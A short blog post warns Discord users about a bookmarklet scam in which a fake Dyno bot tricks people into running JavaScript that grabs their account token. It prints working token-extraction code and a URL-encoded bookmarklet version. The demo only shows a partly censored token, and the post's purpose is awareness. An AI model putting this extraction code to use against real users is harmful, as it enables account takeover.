+++
title = "How bookmarks can steal your Discord Token"
date = "2022-05-23"
+++


## What are [Bookmarklets](https://en.wikipedia.org/wiki/Bookmarklet)
> A bookmarklet is a bookmark stored in a web browser that contains JavaScript commands that add new features to the browser. They are stored as the URL of a bookmark in a web browser or as a hyperlink on a web page. Bookmarklets are usually small snippets of JavaScript executed when user clicks on them. When clicked, bookmarklets can perform a wide variety of operations, such as running a search query from selected text or extracting data from a table. 

Bookmarklets are a fantastic way for developers to do simple tasks on websites with the help of the javascript on the website but can also be used for nefarious reasons as shown in this article. Bookmarklets can execute any form of javascript code given to it and also bypass [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) which is used to protect you on the web.


## What can happen on Discord?

This attack vector makes it possible for users to execute arbitrary javascript code on any site, including Discord which can expose your user token (the unique code to your Discord account). 

On a post made on Reddit [Brilliant Method, Get compromised without giving credentials by dragging in bookmark | Dyno Premium Custom Embed misused to verify on a fake dyno domain](https://www.reddit.com/r/discordapp/comments/uv7w5j/brilliant_method_get_compromised_without_giving/) by [u/Meister-9667](https://www.reddit.com/user/Meister-9667/), we can see that a faked version of the popular Discord bot Dyno is used to trick users into adding the bookmarklet to their bookmarks and pressing it as a way to identify themselves on the server.
![](https://cdn.discordapp.com/attachments/928757369767354369/978387128193019954/ezgif.com-gif-maker.gif)

What happens here is that the user is unknowingly giving the attacker their user token.

## How does this work?

Here below you can see a simple version of a token grabber that makes a popup on the screen with the two last parts of the token censored.

```js
let token;

webpackChunkdiscord_app.push([
    [Math.random()],
    {},
    r => {
       token = Object.values(r.c)
            .find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0)
            .exports.default.getToken();
    },
]);

alert(`${token.split(".")[0]}.██.███████`); // parts of the token is censored
```  

But we can convert the following code to a bookmarklet to test it out. Here below is the above code in a bookmarklet-friendly syntax. Now we can add this to our browser and press it on the Discord website and boom you lost access to your account.

```js
javascript:(function()%7Blet%20token%3BwebpackChunkdiscord_app.push(%5B%5BMath.random()%5D%2C%7B%7D%2Cr%20%3D%3E%20%7Btoken%20%3D%20Object.values(r.c).find(m%20%3D%3E%20m.exports%20%26%26%20m.exports.default%20%26%26%20m.exports.default.getToken%20!%3D%3D%20void%200).exports.default.getToken()%3B%7D%2C%5D)%3Balert(%60%24%7Btoken.split(%22.%22)%5B0%5D%7D.%E2%96%88%E2%96%88.%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%60)%7D)()
```

![](https://cdn.discordapp.com/attachments/928757369767354369/977938749923156068/iCbGIkjVAl3cjXD.gif)

## So what can be done?
Simple, don't put bookmarks you don't trust. If a bot offers this as a way of verification you should imminently be suspicious and conclude that it's most likely a way to scam you.